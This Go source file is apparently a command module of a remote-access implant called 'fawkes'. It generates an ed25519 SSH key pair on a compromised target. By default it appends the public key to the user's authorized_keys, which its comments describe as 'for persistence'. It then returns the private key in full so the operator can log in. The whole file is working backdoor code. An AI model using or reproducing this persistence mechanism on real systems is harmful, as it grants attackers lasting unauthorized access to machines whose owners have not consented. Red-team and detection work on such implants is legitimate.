package commands

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/crypto/ssh"
)

// sshKeysGenerate creates an ed25519 SSH key pair on the target.
// Writes both keys to the target .ssh directory and optionally installs
// the public key into authorized_keys for persistence.
func sshKeysGenerate(args sshKeysArgs) structs.CommandResult {
	// Determine output directory and key file paths
	var sshDir, privKeyPath string
	if args.Path != "" {
		// Full path specified — use its directory as the ssh dir
		privKeyPath = args.Path
		sshDir = filepath.Dir(privKeyPath)
	} else {
		var err error
		sshDir, err = getSSHDir(args.User)
		if err != nil {
			return errorf("Error: %v", err)
		}
		privKeyPath = filepath.Join(sshDir, "id_ed25519")
	}
	pubKeyPath := privKeyPath + ".pub"

	// Create .ssh dir if needed
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		return errorf("Error creating %s: %v", sshDir, err)
	}

	// Generate ed25519 key pair
	pubKey, privKey, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return errorf("Error generating key pair: %v", err)
	}

	// Marshal private key to OpenSSH PEM format
	privPEM, err := ssh.MarshalPrivateKey(privKey, "")
	if err != nil {
		return errorf("Error marshaling private key: %v", err)
	}
	privPEMBytes := pem.EncodeToMemory(privPEM)

	// Marshal public key to authorized_keys format
	sshPubKey, err := ssh.NewPublicKey(pubKey)
	if err != nil {
		return errorf("Error creating SSH public key: %v", err)
	}
	pubKeyLine := strings.TrimSpace(string(ssh.MarshalAuthorizedKey(sshPubKey)))

	// Write private key (0600)
	if err := os.WriteFile(privKeyPath, privPEMBytes, 0600); err != nil {
		return errorf("Error writing private key to %s: %v", privKeyPath, err)
	}

	// Write public key (0644)
	if err := os.WriteFile(pubKeyPath, []byte(pubKeyLine+"\n"), 0644); err != nil {
		return errorf("Error writing public key to %s: %v", pubKeyPath, err)
	}

	var sb strings.Builder
	sb.WriteString("Generated ed25519 key pair:\n")
	sb.WriteString(fmt.Sprintf("  Private: %s\n", privKeyPath))
	sb.WriteString(fmt.Sprintf("  Public:  %s\n", pubKeyPath))

	// Install public key to authorized_keys if "key" param contains "install"
	// or if no key param is given (default: install for persistence)
	if args.Key == "" || strings.EqualFold(args.Key, "install") {
		authKeysPath := filepath.Join(sshDir, "authorized_keys")
		existing, _ := os.ReadFile(authKeysPath)
		existingStr := strings.TrimRight(string(existing), "\n")
		structs.ZeroBytes(existing)

		if !strings.Contains(existingStr, pubKeyLine) {
			newContent := existingStr
			if newContent != "" {
				newContent += "\n"
			}
			newContent += pubKeyLine + "\n"
			if err := os.WriteFile(authKeysPath, []byte(newContent), 0600); err != nil {
				sb.WriteString(fmt.Sprintf("  WARNING: Failed to install to authorized_keys: %v\n", err))
			} else {
				sb.WriteString(fmt.Sprintf("  Installed public key to %s\n", authKeysPath))
			}
		} else {
			sb.WriteString("  Public key already in authorized_keys\n")
		}
	} else {
		sb.WriteString("  Skipped authorized_keys installation (key=noinstall)\n")
	}

	// Return the private key so the operator can use it for access
	sb.WriteString(fmt.Sprintf("\n=== %s ===\n%s\n", privKeyPath, string(privPEMBytes)))
	sb.WriteString(fmt.Sprintf("\n=== %s ===\n%s\n", pubKeyPath, pubKeyLine))

	// Zero sensitive data
	structs.ZeroBytes(privPEMBytes)

	return successResult(sb.String())
}
